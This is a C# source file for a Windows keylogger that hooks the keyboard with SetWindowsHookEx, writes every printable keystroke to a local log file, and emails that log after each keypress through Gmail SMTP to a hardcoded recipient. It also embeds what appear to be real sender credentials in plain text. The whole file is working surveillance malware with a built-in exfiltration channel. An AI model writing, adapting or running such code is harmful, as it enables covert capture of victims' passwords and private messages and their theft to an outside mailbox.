using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

class Program
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string _logFilePath = "keylog.txt";
    private static string _emailRecipient = "bashlover142@gmail.com";
    private static string _emailSender = "macksoupletter@gmail.com";
    private static string _emailSenderPassword = "nofe ettp hxvf mqqp";
    private static string _smtpServer = "smtp.gmail.com";
    private static int _smtpPort = 587;

    static void Main()
    {
        Console.WriteLine("Setting up keylogger...");
        _hookID = SetHook(_proc);
        if (_hookID == IntPtr.Zero)
        {
            Console.WriteLine("Failed to set hook.");
            return;
        }

        Console.WriteLine("Keylogger is running. Press any key to exit...");
        Application.Run();

        Console.WriteLine("Unhooking keyboard...");
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule)
        {
            IntPtr hookID = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            if (hookID == IntPtr.Zero)
            {
                Console.WriteLine("Failed to install hook. Error: " + Marshal.GetLastWin32Error());
            }
            return hookID;
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            char keyChar = (char)vkCode;

            // Only log printable characters
            if (char.IsLetterOrDigit(keyChar) || char.IsPunctuation(keyChar) || char.IsWhiteSpace(keyChar))
            {
                try
                {
                    File.AppendAllText(_logFilePath, keyChar.ToString(), Encoding.UTF8);
                    Console.WriteLine("Logged key: {keyChar}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Failed to write to log file: " + ex.Message);
                }

                // Attempt to send email
                SendEmail();
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void SendEmail()
    {
        try
        {
            using (MailMessage mail = new MailMessage())
            {
                mail.From = new MailAddress(_emailSender);
                mail.To.Add(_emailRecipient);
                mail.Subject = "Keylogger Report";
                mail.Body = "Attached is the keylogger report.";
                mail.Attachments.Add(new Attachment(_logFilePath));

                using (SmtpClient smtp = new SmtpClient(_smtpServer, _smtpPort))
                {
                    smtp.Credentials = new NetworkCredential(_emailSender, _emailSenderPassword);
                    smtp.EnableSsl = true;

                    Console.WriteLine("Attempting to send email...");
                    smtp.Send(mail);
                    Console.WriteLine("Email sent successfully.");
                }
            }
        }
        catch (SmtpException smtpEx)
        {
            Console.WriteLine("SMTP Exception: " + smtpEx.Message);
            Console.WriteLine("Status Code: " + smtpEx.StatusCode);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Exception: " + ex.Message);
        }
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
}
